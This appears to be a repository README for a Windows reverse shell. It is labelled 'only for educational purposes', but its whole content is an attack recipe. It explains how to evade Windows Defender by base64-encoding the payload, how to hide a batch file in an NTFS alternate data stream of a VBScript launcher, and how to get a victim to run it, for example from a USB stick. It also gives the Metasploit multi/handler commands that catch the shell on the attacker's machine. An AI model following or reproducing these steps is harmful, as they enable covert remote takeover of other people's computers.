# Windows Reverse Shell
*Diclaimer:* only for educational purposes

Once run a reverse shell from your Windows Machine gets established to the Attacking Machine. Windows Defender does not notice because it comes from the inside but you have to get the file executed on windows at the first place (e.g. USB-Stick). Because the code is mostly encoded in base64 Windows Defender thinks the file is harmless.
## Requirements
- attacker machine - e.g. Kali Linux
    - metasploit framework installed
- windows machine
## Prepare
1. Edit code.txt and replace the ip address with the address of the attacker machine.
   Keep in mind that the windows machine has to be able to reach you. You have to be on the same local network or it has to be a public ip address.
2. Encode the code using UTF-16LE into base64 code and replace <CODE> in your payload.bat with the encoded code
3. Hide the payload.bat in your launch.vbs using `type payload.bat launch.vbs:payload.bat`. For that you have to use ntfs as your filesystem like windows does.
## Attack
1. On Attacker machine 
    - mfconsole
    - use exploit/multi/handler
    - set payload windows/shell_reverse_tcp
    - set LHOST <attacker ip address (has to be in same lan or public)>
    - set LPORT 4444
    - exploit
2. Windows user execute launch.vbs (e.g. by clicking on it)

